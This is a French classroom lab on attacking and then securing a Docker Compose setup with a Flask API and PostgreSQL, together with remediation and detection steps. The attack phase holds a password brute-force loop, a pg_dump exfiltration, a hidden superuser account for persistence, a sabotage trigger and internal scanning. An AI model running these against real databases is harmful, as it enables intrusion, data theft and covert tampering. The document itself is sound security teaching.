# TP 6 – Audit et sécurisation d’une architecture Docker

## Objectif

> Une architecture peut être techniquement fonctionnelle
> mais totalement compromise par une mauvaise configuration.

# I. Contexte et architecture initiale

## I.1 Prérequis

Reprendre l’architecture du TP 5 :

| Service     | Réseau             | Exposition                    |
| ----------- | ------------------ | ----------------------------- |
| flask_api   | frontend + backend | Port 5000 exposé              |
| postgres_db | backend            | Port 5432 NON exposé à l’hôte |
| attacker    | frontend           | Aucun port exposé             |

### Règle 

> Ne pas utiliser `docker compose down -v` sauf indication explicite.
>
> Utiliser :
>
> * `docker compose up -d --build` → lancer / reconstruire
> * `docker compose down` → arrêter sans perdre les données
> * `docker compose down -v` → uniquement pour remise à zéro complète : supprime toutes les données (PostgreSQL)

### Environnement d’exécution des commandes

Dans ce TP, les commandes doivent être exécutées dans différents contextes :

| Symbole      | Emplacement        | Description                          |
| ------------ | ------------------ | ------------------------------------ |
| 💻           | Machine hôte       | Votre PC (terminal habituel)         |
| 📦 attacker  | Conteneur attacker | Terminal dans le conteneur attaquant |
| 📦 flask_api | Conteneur Flask    | Terminal dans l’API                  |
| 🐘 postgres  | PostgreSQL         | Console `psql`                       |

> **Remarque :** les commandes `apt install`, `psql`, `nmap interne` doivent être exécutées dans le bon conteneur.
> En cas d’erreur, vérifiez toujours où vous êtes.

### Schéma logique

```
Internet
   ↓
[ Machine hôte ]
   ↓
frontend network
   ↓
flask_api
   ↓
backend network
   ↓
postgres_db
```

Architecture segmentée.

### docker-compose.yml

```yaml
version: "3.9" # A commenter pour les versions Docker Compose v2

services:
  flask_api:
    build: .
    container_name: flask_api
    ports:
      - "5000:5000"
    environment:
      POSTGRES_USER: admin
      POSTGRES_PASSWORD: admin
      POSTGRES_DB: students_db
      POSTGRES_HOST: postgres_db
    depends_on:
      postgres_db:
        condition: service_healthy
    networks:
      - frontend
      - backend

  postgres_db:
    image: postgres:15
    container_name: postgres_db
    environment:
      POSTGRES_USER: admin
      POSTGRES_PASSWORD: admin
      POSTGRES_DB: students_db
    volumes:
      - pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U admin -d students_db"]
      interval: 5s
      timeout: 5s
      retries: 5
    networks:
      - backend

  attacker:
    image: debian:stable-slim
    container_name: attacker
    command: sleep infinity
    networks:
      - frontend

volumes:
  pgdata:

networks:
  frontend:
  backend:
```

### Remarque

> Un port exposé (`-p 5000:5000`) est accessible depuis l’extérieur.
> Un port interne Docker est accessible uniquement depuis les conteneurs du même réseau.

---

## I.2 Hypothèses de sécurité

### Contexte

Architecture initiale :

* `flask_api` → réseaux `frontend` + `backend`
* `postgres_db` → réseau `backend`
* `attacker` → réseau `frontend`
* Port 5000 exposé
* Port 5432 non exposé

L’architecture est segmentée.

## I.3 Initialisation et remise à zéro

### Objectif

Créer quelques enregistrements dans la base afin de :

* visualiser les données avant l’attaque
* observer les modifications après exploitation
* rendre l’impact sécurité concret et mesurable

### Étape 1 – Vérifier que l’environnement fonctionne

Sur la machine hôte :

```bash
# 💻 (machine hôte)
docker compose down -v
docker compose up -d --build
docker ps
```

* `down` → arrête les conteneurs
* `-v` → supprime les volumes (donc les données PostgreSQL)
* `up --build` → recrée tout proprement

> Sans `-v`, la base détruite ne sera pas recréée correctement.

Vérifier que les conteneurs suivants sont actifs :

* flask_api
* postgres_db
* attacker

### Étape 2 – Ajouter des étudiants via l’API

Depuis la machine hôte (terminal) :

```bash
# 💻 (machine hôte)
curl -X POST http://localhost:5000/students/ \
  -H "Content-Type: application/json" \
  -d '{"name":"Charles","email":"charles@carnus.fr"}'

curl -X POST http://localhost:5000/students/ \
  -H "Content-Type: application/json" \
  -d '{"name":"Prenom1","email":"prenom1@carnus.fr"}'

curl -X POST http://localhost:5000/students/ \
  -H "Content-Type: application/json" \
  -d '{"name":"Prenom2","email":"prenom2@ac-toulouse.fr"}'
```

### Étape 3 – Vérifier les données

```bash
# 💻 (machine hôte)
curl http://localhost:5000/students/
```

Résultat :

```json
[
  {"id":1,"name":"Charles","email":"charles@carnus.fr"},
  {"id":2,"name":"Prénom1","email":"prenom1@carnus.fr"},
  {"id":3,"name":"Prénom2","email":"prenom2@ac-toulouse.fr"}
]
```

---

# II. Phase 1 – Reconnaissance (Vision Attaquant)

**Analyse et compromission d’une architecture Docker**

## Objectifs

* Identifier la surface d’attaque d’une architecture Docker
* Distinguer exposition externe et communication interne
* Scanner un réseau interne
* Exploiter une mauvaise segmentation
* Analyser l’impact d’un mot de passe faible
* Expliquer les conséquences d’une compromission latérale

## II.1 Reconnaissance externe (vision Internet)

Objectif : identifier ce qui est visible depuis l’extérieur.

> Toutes les commandes sont exécutées sur **votre machine hôte (votre PC)**.

### II.1.1 Scan complet des ports

```bash
# 💻 (machine hôte)
nmap -sT -p- localhost
```

ou pour un scan SYN (privilèges administrateur requis) :

```bash
# 💻 (machine hôte)
# Linux/Mac : sudo facultatif mais recommandé
# Windows : PowerShell en admin
nmap -sS localhost
```

#### Questions

1. Quels ports apparaissent ouverts ?
2. PostgreSQL (port 5432) apparaît-il ?
3. Pourquoi ?

<details>
<summary><strong>Réponses</strong>
</summary>

Ports visibles : **5000/tcp** → API Flask

Éventuellement d'autres ports liés au système hôte.

Ports non visibles: 5432

* seul le port `5000` est exposé via `-p`
* `5432` est uniquement accessible sur le réseau Docker interne

</details>

### II.1.2 Détection de service

```bash
# 💻 (machine hôte)
nmap -sV localhost
```

Identifier :

* Le service détecté sur le port 5000
* La version si identifiable

Réponse :

* Service HTTP détecté sur 5000
* Flask parfois identifié comme "Werkzeug"

Même sans exposer la DB, l’API reste une surface d’attaque.

---

## II.2 Reconnaissance interne (vision réseau frontend)

Objectif : Observer la visibilité depuis un conteneur interne.

### II.2.1 Accès au conteneur "attacker"

> Vérifier le vrai nom avec `docker ps`

```bash
# 💻 (machine hôte)
docker ps
```

Puis, depuis la machine hôte :

```bash
# 💻 (machine hôte)
docker exec -it attacker bash
```

OU

```bash
# 💻 (machine hôte)
docker exec -it attacker sh
```

Vous êtes maintenant à l’intérieur du conteneur (prompt `root@xxxxx:/#`).

Installer nmap dans "attacker" :

Dans le conteneur attacker (prompt `root@xxxxx:/#`) :

```bash
# 📦 attacker (root@xxxxx:/#)
apt update && apt install nmap -y
```

> Sous Windows, installer Nmap + Npcap avant utilisation (si nécessaire)

### II.2.2 Identification du subnet Docker (frontend)

Sur la machine hôte (ouvrir un autre terminal) :

```bash
# 💻 (machine hôte)
docker network ls
```

Repérer le nom du réseau frontend : `xyz_frontend`.

Puis : en remplaçant `xyz_frontend` par le bon nom affiché dans le terminal.

```bash
# 💻 (machine hôte)
docker network inspect xyz_frontend
```

Repérer la ligne `"Subnet": "172.X.0.0/16"`.

### II.2.3 Scan réseau interne

Puis dans le conteneur "attacker" (prompt `root@xxxxx:/#`) :

(Le subnet dépend du réseau Docker : remplacer X par la valeur trouvée)

```bash
# 📦 attacker (root@xxxxx:/#)
nmap -sT 172.X.0.0/16
```

OU

```bash
# 📦 attacker (root@xxxxx:/#)
nmap -sT 172.X.0.0/24
```

> Remarque : scanner `/24` est plus rapide mais peut louper des conteneurs.

#### Questions

1. Le port 5000 est-il visible ?
2. Le port 5432 est-il visible ?
3. Pourquoi ?

<details>
<summary><strong>Réponses</strong>
</summary>

Visible : flask_api (port 5000/tcp) → 5000/tcp open

> Éventuellement d’autres ports liés à l'OS, mais **pas 5432**.

Non visible : postgres_db (port 5432)

Pourquoi ?

* flask_api → frontend + backend
* postgres_db → backend uniquement
* attacker → frontend uniquement
* les réseaux sont isolés : Docker isole les réseaux.

Docker bridge = segmentation réseau réelle.

Un conteneur ne voit que les réseaux auxquels il appartient.

</details>

---

## II.3 Tentative d’accès à PostgreSQL (depuis frontend)

Toujours dans le conteneur "attacker" (prompt `root@xxxxx:/#`) :

```bash
# 📦 attacker (root@xxxxx:/#)
apt install postgresql-client -y
# Puis : test de connexion à la BDD
psql -h postgres_db -U admin -d students_db
```

#### Questions

1. La connexion fonctionne-t-elle ?
2. Pourquoi ?

<details>
<summary><strong>Réponses</strong>
</summary>

Échec de connexion. 

> Le conteneur attacker ne partage pas le réseau backend.
> Il ne peut pas résoudre ou atteindre postgres_db.

Erreur possible :

```
could not translate host name "postgres_db" ...
```

Ce n’est pas le mot de passe qui protège ici.
C’est la segmentation réseau.

> Ce n’est PAS une erreur du TP.
C’est la preuve que la segmentation réseau protège la base.

</details>

---

# III. Phase 2 – Exploitation et compromission

## III.1 Attaque par mot de passe faible

Objectif : Montrer l’impact d’un mot de passe faible.

### Contexte

Toutes les premières commandes doivent être exécutées :

> **Sur la machine hôte (votre PC)**
> Dans un terminal normal
> PAS dans un conteneur

### III.1.1 Configuration volontairement vulnérable

Dans votre projet, ouvrez le fichier :

```
docker-compose.yml
```

Vérifiez que PostgreSQL utilise dans `docker-compose.yml` :

```yaml
POSTGRES_PASSWORD: admin
```

> Le mot de passe doit être volontairement faible.

* Important : Redémarrer avec suppression des volumes pour recréer la base.

Sur la machine hôte :

```bash
# 💻 (machine hôte)
docker compose down -v
docker compose up -d --build
```

* Vérifier que les conteneurs tournent

Toujours sur la machine hôte :

```bash
# 💻 (machine hôte)
docker ps
```

Vous devez voir :

* flask_api
* postgres_db
* attacker

### III.1.2 Simulation brute force depuis flask_api

* Entrer dans le conteneur flask_api

Toujours depuis la machine hôte :

```bash
# 💻 (machine hôte)
docker exec -it flask_api bash
```

Vous êtes maintenant : À l’intérieur du conteneur `flask_api`. Le prompt change généralement :

```
root@xxxxx:/app#
```

* Installer le client PostgreSQL

Dans le conteneur `flask_api` (prompt `root@xxxxx:/app#`) :

```bash
# 📦 flask_api (root@xxxxx:/app#)
apt update && apt install postgresql-client -y
```

* flask_api est sur le réseau backend
* Il peut communiquer avec postgres_db
* "attacker" ne peut pas (pour l’instant)

* **Simulation d’une attaque par dictionnaire**

Toujours dans `flask_api` (prompt `root@xxxxx:/app#`):

Copier-coller :

```bash
# 📦 flask_api (root@xxxxx:/app#)
echo " "
echo "=========*********========="
found=false
for pwd in admin123 admin password 123456 postgres; do
  echo "Test du mot de passe : $pwd"
  PGPASSWORD=$pwd psql -h postgres_db -U admin -d students_db -c '\q' 2>/dev/null \
  && echo ">>> Mot de passe trouvé : $pwd" && found=true && break
done
[ "$found" = false ] && echo ">>> Aucun mot de passe trouvé"
```

Ce script, pour chaque mot de passe :

1. Il tente une connexion
2. Si la connexion fonctionne :

   * Il affiche "Mot de passe trouvé"
   * Il arrête la boucle

### III.1.3 Analyse de l’impact (des résultats)

Comme le mot de passe est : `admin`

Le script doit afficher :

```
Test du mot de passe : admin
>>> Mot de passe trouvé : admin
```

Très rapide. Moins d’une seconde.

* Port 5432 non exposé à l’hôte mais accessible depuis réseau backend

#### Questions

1. Pourquoi le mot de passe a-t-il été trouvé si rapidement ?
2. Que se passerait-il si le port 5432 (DB) était exposé à Internet ?
3. Pourquoi cette attaque fonctionne-t-elle ici ?

<details>
<summary><strong>Réponses</strong>
</summary>

1. R1

  * Mot de passe faible
  * Présent dans liste de test
  * Pas de limitation de tentative

2. Un attaquant pourrait :

  * Scanner le port
  * Tester des milliers de mots de passe
  * Compromettre la base

3. R3

  * flask_api est sur backend
  * accès réseau autorisé
  * aucun mécanisme de protection DB

Segmentation seule ≠ sécurité totale.
Un service compromis peut devenir pivot.

</details>

---

## III.2 Analyse du trafic réseau

**Comprendre d’où vient le trafic**

Dans ce TP :

* Si vous lancez `nmap localhost`
  → le trafic circule **entre votre PC et Docker**
* Si vous lancez une commande dans un conteneur
  → le trafic circule **dans le réseau Docker interne**

> Donc **l’interface à sélectionner dépend de ce que vous observez**

### III.2.1 Observation scan externe (Wireshark)

Objectif : Voir ce que produit un scan quand on scanne sa propre machine.

* **Lancer Wireshark.**

Sélectionner l'interface :

| OS      | Interface à choisir |
| ------- | ------------------- |
| Linux   | `lo` (loopback)     |
| Windows | `Loopback`          |
| Mac     | `lo0`               |

1. Double-cliquez sur l’interface loopback
2. La capture démarre

* **Lancer le scan**

Dans **un autre terminal (sur votre PC, PAS dans un conteneur)** :

```bash
# 💻 (machine hôte)
nmap -sT localhost
```

* **Filtre Wireshark :**

Dans la barre filtre Wireshark :

```
tcp
```

Observer :

* SYN
* SYN-ACK
* RST

Pour chaque port testé :

**Port fermé** SYN → RST

**Port ouvert (5000)** SYN → SYN-ACK → ACK

### III.2.2 Observation trafic interne PostgreSQL (flask → postgres : `flask_api` → `postgres_db`)

**Objectif**

Observer le trafic réseau entre deux conteneurs Docker :

* `flask_api` (client)
* `postgres_db` (serveur PostgreSQL)

> Il s’agit d’une communication **conteneur → conteneur**.

**Remarque**

Ce trafic **ne passe pas par localhost**.

Il transite via :

* Linux : interface `docker0` ou `br-xxxx`
* Windows : `vEthernet (DockerNAT)`
* Mac : interface non accessible → capture depuis un conteneur
  
**Principe**

1. Lancer une capture réseau
2. Générer une connexion PostgreSQL
3. Observer les paquets sur le port 5432

* **Filtre utilisé**

* **`Wireshark`** :

```
tcp.port == 5432
```

* **`tcpdump`** :

```bash
port 5432
```

#### Procédure

1. Lancer la capture réseau

  * Cas Linux (depuis la machine hôte)

  ```bash
  # 💻 (machine hôte)
  sudo tcpdump -i docker0 port 5432
  ```
  
  Si rien n’apparaît, identifier l’interface Docker :

  ```bash
  ip a | grep br-
  ```

  Puis utiliser :

  ```bash
  # 💻 (machine hôte)
  sudo tcpdump -i br-xxxx port 5432
  ```

  * Cas Mac / Windows (depuis un conteneur)

  ```bash
  # 💻 (machine hôte)
  docker exec -it flask_api bash
  # 📦 flask_api (root@xxxxx:/app#)
  apt update && apt install -y tcpdump
  tcpdump -i any port 5432
  ```

2. Générer du trafic PostgreSQL

  Dans **un second terminal** :

  ```bash
  # 💻 (machine hôte)
  docker exec -it flask_api bash
  ```

  Installer le client PostgreSQL :

  ```bash
  # 📦 flask_api (root@xxxxx:/app#)
  apt update && apt install -y postgresql-client
  ```

  Lancer une connexion :

  ```bash
  # 📦 flask_api (root@xxxxx:/app#)
  psql -h postgres_db -U admin -d students_db
  ```

  Entrer volontairement un **mauvais mot de passe**

#### Observation

Dans `tcpdump`, on observe :

* Tentative de connexion TCP
* Échange client ↔ serveur
* Refus d’authentification PostgreSQL

**Question**

Voyez-vous le mot de passe en clair ?

<details>
<summary><strong>Réponse</strong>
</summary>

> Non.

PostgreSQL chiffre l’authentification (SCRAM ou MD5).
Le mot de passe ne circule pas en clair.

Mais :

* Le port est détectable
* Le service est identifiable
* Le brute force reste possible

* HTTP (port 5000) → en clair
* PostgreSQL auth → hashé
* HTTPS → chiffré

</details>

**Remarque**

Cette partie montre que :

* Les conteneurs communiquent via un réseau Docker interne
* Le trafic ne passe pas par `localhost`
* PostgreSQL écoute sur le port `5432`
* Une simple tentative de connexion génère du trafic observable

**Conclusion**

L’observation du trafic confirme que :

* La communication inter-conteneurs fonctionne correctement
* Le réseau Docker isole mais permet les échanges internes
* Les outils comme `tcpdump` permettent d’analyser ces flux en temps réel

### III.2.3 Comparaison HTTP vs trafic DB

Depuis votre machine hôte :

```bash
# 💻 (machine hôte)
curl http://localhost:5000
```

> Sous Windows, tester :

```powershell
# 💻 (machine hôte)
Invoke-WebRequest http://localhost:5000
```

* Interface : loopback

* Filtre :

```
http
```

Observer les données en clair :

* GET / HTTP/1.1
* Réponse serveur
* Contenu en clair

#### Remarques

HTTP → non chiffré
HTTPS → chiffré

Docker protège l’exposition
La segmentation protège l’accès
Mais le trafic interne reste observable

```
[ PC ]
   |
 localhost (loopback)
   |
[ Docker bridge ]
   |
frontend      backend
   |              |
attacker      postgres
```

---

### III.2.4 Préparation des données (jeu de données initial)

#### Objectif

Insérer des données dans la base afin de simuler une base applicative réelle.

Ces données permettront de démontrer :

* le **vol d’informations**
* la **corruption des données**
* l’**exfiltration de base**

#### Connexion à PostgreSQL

Depuis la machine hôte :

```bash
# 💻 (machine hôte)
docker exec -it postgres_db psql -U admin -d students_db
```

#### Vérification de la table

Lister les tables :

```sql
-- 🐘 postgres
\dt
```

Afficher la structure :

```sql
-- 🐘 postgres
\d students
```

#### Insertion de données

Insérer plusieurs étudiants :

```sql
-- 🐘 postgres
INSERT INTO students (name, email) VALUES
('Nom1 Prénom1', 'prenom1.nom1@carnus.fr'),
('Nom2 Prénom2', 'prenom2.nom2@carnus.fr'),
('Nom3 Prénom3', 'prenom3.nom3@carnus.fr'),
('Nom4 Prénom4', 'prenom4.nom4@carnus.fr'),
('Nom5 Prénom5', 'prenom5.nom5@carnus.fr'),
('Admin Carnus', 'admin@carnus.fr');
```

#### Vérification

Afficher le contenu :

```sql
-- 🐘 postgres
SELECT * FROM students;
```

---

## III.3 Rupture de segmentation réseau

### Objectif

Montrer qu’une mauvaise configuration réseau peut :

* rendre la base de données accessible
* permettre une compromission totale
* impacter la confidentialité, l’intégrité et la disponibilité

### Situation initiale (sécurisée)

Architecture actuelle :

* `flask_api` → frontend + backend
* `postgres_db` → backend
* `attacker` → frontend

Donc :

> `attacker` ne peut pas accéder à `postgres_db`.

C’est une architecture segmentée.

### III.3.1 Modification de la configuration réseau (docker-compose)

Modifier `docker-compose.yml` :

```yaml
attacker:
  image: debian:stable-slim
  container_name: attacker
  command: sleep infinity
  networks:
    - backend
```

* **Redémarrer l’environnement**

```bash
# 💻 (machine hôte)
docker compose down -v
docker compose up -d --build
```

* **Identifier le subnet backend**

Depuis la machine hôte :

```bash
# 💻 (machine hôte)
docker network ls
```

Repérer :

```
nom_du_reseau_backend
```

Puis :

```bash
# 💻 (machine hôte)
docker network inspect <nom_du_reseau_backend>
```

Repérer :

```
"Subnet": "172.X.0.0/16"
```

### III.3.2 Scan backend (depuis attacker)

Dans le conteneur attacker :

```bash
# 💻 (machine hôte)
docker exec -it attacker bash
```

Installer nmap :

```bash
# 📦 attacker (root@xxxxx:/#)
apt update
apt install nmap -y
```

Scanner uniquement le port PostgreSQL :

```bash
# 📦 attacker (root@xxxxx:/#)
nmap -p 5432 172.X.0.0/24
# Pour afficher uniquement les hôtes avec port ouvert.
nmap -p 5432 172.X.0.0/24 --open
```

> Le réseau réel est en `/16`, mais on limite à `/24` pour accélérer le scan

#### Questions

1. PostgreSQL (port 5432) est-il visible ?
2. Peut-on tenter une connexion ?
3. Quelle configuration est la plus sécurisée ?

<details>
<summary><strong>Réponse</strong>
</summary>

Maintenant :

* Port 5432 visible : `5432/tcp open postgresql`
* Connexion possible
* attacker uniquement sur frontend

> Une simple ligne YAML peut compromettre toute l’infrastructure.

</details>

### III.3.3 Connexion à la base

Toujours dans attacker :

```bash
# 📦 attacker (root@xxxxx:/#)
apt install postgresql-client -y
psql -h postgres_db -U admin -d students_db
```

Mot de passe : `admin`

1. La connexion est-elle possible ?
2. Qu’est-ce qui a changé ?
3. Pourquoi cette configuration est dangereuse ?

<details>
<summary><strong>Réponses</strong>
</summary>

Connexion possible.

En ajoutant `attacker` au réseau `backend` : `attacker` est maintenant sur le même réseau que `postgres_db` --> Rupture de la segmentation

* Il peut voir le port 5432
* Il peut tenter une connexion
* Il peut lancer une attaque par dictionnaire
* La base devient attaquable

* Un simple conteneur compromis donne accès à la base
* Perte totale de confidentialité, intégrité, disponibilité

> La segmentation réseau était la seule barrière : Accessible depuis réseau backend.

</details>

## III.4 Compromission complète

Une fois connecté :

### III.4.1 Atteinte à la confidentialité

Lister les tables :

```sql
-- 🐘 postgres
\dt
```

Insérer plusieurs étudiants :

```sql
-- 🐘 postgres
INSERT INTO students (name, email) VALUES
('Nom1 Prénom1', 'prenom1.nom1@carnus.fr'),
('Nom2 Prénom2', 'prenom2.nom2@carnus.fr'),
('Nom3 Prénom3', 'prenom3.nom3@carnus.fr'),
('Nom4 Prénom4', 'prenom4.nom4@carnus.fr'),
('Nom5 Prénom5', 'prenom5.nom5@carnus.fr'),
('Admin Carnus', 'admin@carnus.fr');
```

Afficher le contenu :

```sql
-- 🐘 postgres
SELECT * FROM students;
```

Impact :

* Vol de données personnelles
* Extraction emails
* Exfiltration base complète

### III.4.2 Atteinte à l’intégrité

```sql
-- 🐘 postgres
-- Toutes les lignes seront modifiées.
UPDATE students SET email='donnees_compromises@carnus.fr';
-- Uniquement id = 1
UPDATE students 
SET email='une_donnee_compromise@carnus.fr'
WHERE id=1;
```

Vérifier :

```sql
-- 🐘 postgres
SELECT * FROM students;
```

Impact :

* Corruption données
* Détournement emails

### III.4.3 Atteinte à la disponibilité

```sql
-- 🐘 postgres
DROP TABLE students;
```

Conséquence :

* L’application Flask renverra des erreurs 500
* Perte totale des données

> CIA :
> 
> * C → Confidentialité
> * I → Intégrité
> * A → Disponibilité
> 
> Les 3 sont touchés.

## III.5 Post-exploitation : Exfiltration & Persistance

### III.5.1 Exfiltration (Dump complet : pg_dump)

```bash
# 📦 attacker (root@xxxxx:/#)
apt update
apt install postgresql-client -y || true
PGPASSWORD=admin pg_dump -h postgres_db -U admin students_db > dump.sql
```

* `dump.sql` est créé **dans le conteneur `attacker`**
* généralement dans le dossier courant (`/root`)

Puis :

```bash
ls -l dump.sql
head dump.sql
cat dump.sql
```

* Si on veut récupérer le dump sur la machine :

Depuis **l’hôte** :

```bash
# 💻 (machine hôte)
docker cp attacker:/dump.sql .
```

Puis :

```bash
# 💻 (machine hôte)
ls
```

#### Résultat

Un fichier SQL contenant :

* CREATE TABLE
* INSERT
* Données complètes

> Un simple accès réseau interne suffit à voler toute la base.

### III.5.2 Persistance (Création utilisateur furtif)

Un attaquant ne détruit pas forcément immédiatement.
Il peut :

* Créer un accès caché
* Laisser une porte ouverte

```bash
# 📦 attacker (root@xxxxx:/#)
psql -h postgres_db -U admin -d students_db
```

Dans psql :

```sql
-- 🐘 postgres
CREATE USER backup_admin WITH PASSWORD 'Secure123!';
GRANT ALL PRIVILEGES ON DATABASE students_db TO backup_admin;
-- Puis
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO backup_admin;
-- OU
ALTER USER backup_admin WITH SUPERUSER;
```

#### Résultat

Même si :

* Mot de passe admin changé
* Utilisateur admin supprimé

→ L’attaquant peut revenir (accès maintenu).

> Une compromission n’est pas finie quand on change le mot de passe.
> 
> Parce que l’attaquant peut :
>
> * créer d’autres comptes
> * modifier privilèges
> * installer triggers
> * exfiltrer données

---

Découverte dans la base :

```sql
-- 🐘 postgres
SELECT usename FROM pg_user;
```

Un utilisateur inconnu apparaît :

```
backup_admin
```

Investigation :

```sql
-- 🐘 postgres
\du
```

* Privilèges élevés
* Compte non documenté

### III.5.3 Sabotage applicatif silencieux (trigger)

Un attaquant peut :

* Modifier sans casser
* Corrompre lentement

#### Exemple 1 – Altération discrète

```sql
-- 🐘 postgres
UPDATE students
SET email = CONCAT('old_', email);
```

L’application fonctionne toujours.
Mais les emails sont faux.

```sql
-- 🐘 postgres
SELECT * FROM students;
```

#### Exemple 2 – Déclencheur malveillant

```sql
-- 🐘 postgres
CREATE OR REPLACE FUNCTION sabotage()
RETURNS trigger AS $$
BEGIN
  NEW.email = 'compromised@carnus.fr';
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- OU Trigger malveillant
CREATE TRIGGER sabotage_trigger
BEFORE INSERT ON students
FOR EACH ROW
EXECUTE FUNCTION sabotage();
```

Conséquence : Chaque nouvel étudiant est corrompu automatiquement.

> Le sabotage peut être automatisé et invisible.

#### Détection :

```sql
-- 🐘 postgres
\d students
```

Ou pour Trigger malveillant :

```sql
-- 🐘 postgres
SELECT tgname FROM pg_trigger;
```

Découverte : Un trigger malveillant modifie les emails à chaque insertion.

Vérification :

```sql
-- 🐘 postgres
INSERT INTO students (name, email) VALUES
('TestN TestP', 'testp.testn@carnus.fr');
```

Puis :

```sql
-- 🐘 postgres
select * from students;
```

Résultat :

```text
  7 | TestN TestP   | compromised@carnus.fr
```

---

## III.6 Pivot réseau

Un attaquant interne peut :

* Scanner d’autres conteneurs
* Explorer le réseau backend

Depuis attacker :

```bash
# 📦 attacker (root@xxxxx:/#)
apt update
apt install iproute2 iputils-ping nmap -y
```

```bash
# 📦 attacker (root@xxxxx:/#)
nmap 172.X.0.0/24
# OU scan complet
nmap -sT -p- 172.X.0.0/24
```

Puis :

```bash
# 📦 attacker (root@xxxxx:/#)
ip route
```

La compromission d’un service interne peut devenir :

→ Point d’entrée vers toute l’infrastructure

## Conclusion

Une simple modification réseau :

```yaml
networks:
  - backend
```

suffit à transformer :

✔️ une architecture sécurisée
en
✖️ une architecture totalement compromise

---
---

# IV. Phase 3 – Remédiation & Sécurisation

## Objectifs

* Appliquer le principe du moindre privilège
* Mettre en place une segmentation réseau Docker
* Supprimer une exposition de port inutile
* Modifier des variables sensibles
* Renforcer un mot de passe faible
* Produire un compte rendu d’intervention

### Finalité

Mettre en œuvre des mesures de sécurisation et réduire la surface d’attaque.

## IV.1 Renforcement des secrets (mots de passe)

### IV.1.1 Mot de passe robuste

Changer :

```yaml
POSTGRES_PASSWORD: Qw9#kLp!72Zx
```

Sur la machine hôte :

```bash
# 💻 (machine hôte)
docker compose down -v
docker compose up -d --build
```

Entrer dans `flask_api` :

```bash
# 💻 (machine hôte)
docker exec -it flask_api bash
```

### IV.1.2 Vérification échec brute force

Relancer le script de brute force.

```bash
# 📦 flask_api (root@xxxxx:/app#)
found=false
for pwd in admin password 123456 postgres; do
  echo "Test du mot de passe : $pwd"
  PGPASSWORD=$pwd psql -h postgres_db -U admin -d students_db -c '\q' 2>/dev/null \
  && echo ">>> Mot de passe trouvé : $pwd" && found=true && break
done
[ "$found" = false ] && echo ">>> Aucun mot de passe trouvé"
```

#### Question

Pourquoi l’attaque échoue-t-elle maintenant ?

Réponse :

Parce que :

* Mot de passe complexe
* Non présent dans dictionnaire simple

## IV.2 Principe du moindre privilège

Objectif : Montrer que même si un attaquant accède à la DB → L’impact peut être limité (réduire les dégâts).

### IV.2.1 Création utilisateur restreint

```bash
# 📦 flask (root@xxxxx:/#)
apt update
apt install postgresql-client -y
# Puis
psql -h postgres_db -U admin -d students_db
```

Mot de passe : `Qw9#kLp!72Zx` 

Dans PostgreSQL (en admin) :

```sql
-- 🐘 postgres
CREATE USER app_user WITH PASSWORD 'AppUser123!';
GRANT CONNECT ON DATABASE students_db TO app_user;

-- Puis
\c students_db

-- Puis
GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE students TO app_user;
```

Permissions limitées :

✔ SELECT, INSERT, UPDATE, DELETE
✖ DROP
✖ CREATE USER
✖ CREATE DATABASE
✖ ALTER SYSTEM

### IV.2.2 Modification application : Adaptation Flask pour utiliser app_user

Dans `docker-compose.yml` :

```yaml
POSTGRES_USER: app_user
POSTGRES_PASSWORD: AppUser123!
```

Redémarrer :

```bash
# 💻 (machine hôte)
docker compose down -v
docker compose up -d --build
```

Entrer dans `flask_api` :

```bash
# 💻 (machine hôte)
docker exec -it flask_api bash
```

### IV.2.3 Tests de limitation

Depuis attacker :

Connexion avec `app_user`.

```bash
# 📦 flask (root@xxxxx:/#)
apt update
apt install postgresql-client -y
# Puis
psql -h postgres_db -U app_user -d students_db
```

Mot de passe : `AppUser123!` 

Tester :

```sql
-- 🐘 postgres
DROP TABLE students;
```

Résultat attendu :

✖️ Permission denied.

Essayer :

```sql
-- 🐘 postgres
CREATE USER test;
```

✖️ Refusé.

## IV.3 Architecture sécurisée finale

* Segmentation restaurée
* Base non exposée
* Comptes limités
* Défense en profondeur

---

# V. Supervision et détection d’incident

## V.1 Surveillance des conteneurs Docker

### Voir l’activité en temps réel

```bash
# 💻 (machine hôte)
docker stats
```

> Permet d’observer :

* CPU
* RAM
* I/O
* Réseau

Intérêt :

* Un brute force massif → pic CPU
* Un dump massif → pic réseau

### Voir les événements Docker

```bash
# 💻 (machine hôte)
docker events
```

Permet d’observer :

* Restart
* Création / suppression
* Connexions réseau

## V.2 Analyse des logs applicatifs

### Logs Flask

```bash
# 💻 (machine hôte)
docker logs flask_api
```

ou en temps réel :

```bash
# 💻 (machine hôte)
docker logs -f flask_api
```

À observer :

* Erreurs 500 après DROP TABLE
* Tentatives répétées de connexion DB

### Logs PostgreSQL

```bash
# 💻 (machine hôte)
docker logs postgres_db
```

On verra :

* Tentatives login répétées
* Échecs login
* Connexions réussies

A tester après brute force.

## V.3 Surveillance réseau

### Voir les connexions ouvertes dans un conteneur

```bash
# 💻 (machine hôte)
docker exec -it flask_api bash
```

Dans `flask_api` :

```bash
# 📦 flask (root@xxxxx:/#)
apt update && apt install net-tools -y
netstat -ant
```

ou :

```bash
ss -ant
```

Permet de voir :

* Qui est connecté
* IP interne Docker
* Ports utilisés

### Voir les connexions actives à PostgreSQL

```bash
# 📦 flask (root@xxxxx:/#)
apt update
apt install postgresql-client -y
# Puis
psql -h postgres_db -U app_user -d students_db
```

Mot de passe : `AppUser123!` 

Dans psql :

```sql
-- 🐘 postgres
SELECT client_addr, usename, application_name
FROM pg_stat_activity;
```

On peut détecter :

* Connexions depuis attacker : IP suspecte
* Utilisateur suspect (backup_admin)

## V.4 Détection d’un compte suspect

```sql
-- 🐘 postgres
SELECT usename FROM pg_user;
```

Puis :

```sql
-- 🐘 postgres
\du
```

> Identifier privilèges anormaux.

## V.5 Détection de trigger malveillant

```sql
-- 🐘 postgres
\dt
\d students
SELECT tgname FROM pg_trigger;
```

## V.6 Détection d’exfiltration

Sur l’hôte :

```bash
# 💻 (machine hôte)
docker stats
```

Observer :

* Pic réseau sortant
* Activité CPU anormale

---

## Conclusion

Ce TP démontre :

* L’importance de la segmentation réseau
* Le danger des mots de passe faibles
* L’impact réel d’une mauvaise configuration Docker
* Le principe du moindre privilège
* La défense en profondeur

| Erreur                 | Impact               |
| ---------------------- | -------------------- |
| Mauvaise segmentation  | Pivot réseau         |
| Mot de passe faible    | Compromission rapide |
| Privilèges excessifs   | Destruction DB       |
